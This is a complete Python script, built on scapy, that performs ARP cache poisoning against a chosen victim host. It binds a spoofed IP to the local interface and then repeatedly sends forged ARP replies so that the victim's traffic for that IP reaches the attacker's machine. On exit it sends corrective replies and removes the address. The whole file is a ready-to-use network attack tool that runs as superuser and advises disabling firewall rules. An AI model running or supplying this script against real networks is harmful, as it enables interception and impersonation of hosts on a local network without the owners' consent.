#!/usr/bin/python3
# !!! RUN AS SUPERUSER !!!
# Usage: ./ip_spoof.py <victim-ip> <spoofed-ip> <interface>

# Copyright 2020 Lyubomir Kyorovski
#
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, see <http://www.gnu.org/licenses/>.
import sys
import time
from subprocess import call

import scapy.all as scapy
import netifaces

victim_ip, spoofed_ip, interface_name = sys.argv[1:]

local_mac = scapy.get_if_hwaddr(interface_name)
local_ip = scapy.get_if_addr(interface_name)

victim_mac = scapy.getmacbyip(victim_ip)
spoofed_mac = scapy.getmacbyip(spoofed_ip)

print(f'[+] Set victim to {victim_ip}')
print(f'[+] Spoofing -- MAC: {spoofed_mac}, IP: {spoofed_ip} -> MAC: {local_mac}, IP: {local_ip}')

print(f'[+] Adding {spoofed_ip} to interface {interface_name}')
print(f'[!] Don\'t forget to disable iptables rules if you have any')
interface_prefix_len = netifaces.ifaddresses(interface_name)[netifaces.AF_INET][0]['netmask'].count('255') * 8
ret_code = call(['ip', 'addr', 'add', f'{spoofed_ip}/{interface_prefix_len}', 'dev', interface_name])
assert ret_code == 0
try:
    while True:
        packet = scapy.ARP(
            op=2,
            pdst=victim_ip,
            hwdst=victim_mac,
            psrc=spoofed_ip,
            hwsrc=local_mac
        )
        scapy.send(packet, verbose=False)
        print(f'[+] Sent packet to {victim_ip}: MAC: {spoofed_mac}, IP: {spoofed_ip} -> MAC: {local_mac}, IP: {local_ip}')
        time.sleep(2)

except KeyboardInterrupt:
    print('[+] Stopping...')
except Exception as e:
    print(str(e))
    print('[-] Interrupted: Exiting')
finally:
    print('[+] De-poisoning ARP')
    i = 0
    while i < 3:
        packet = scapy.ARP(
          op=2,
          pdst=victim_ip,
          hwdst=victim_mac,
          psrc=spoofed_ip,
          hwsrc=spoofed_mac
        )
        scapy.send(packet, verbose=False)
        i += 1
        time.sleep(2)
    print(f'[+] Removing {spoofed_ip} from interface {interface_name}')
    ret_code = call(['ip', 'addr', 'del', f'{spoofed_ip}/32', 'dev', interface_name])
    if ret_code > 0:
        ret_code = call(['ip', 'addr', 'del', spoofed_ip, 'dev', interface_name])
    assert ret_code == 0
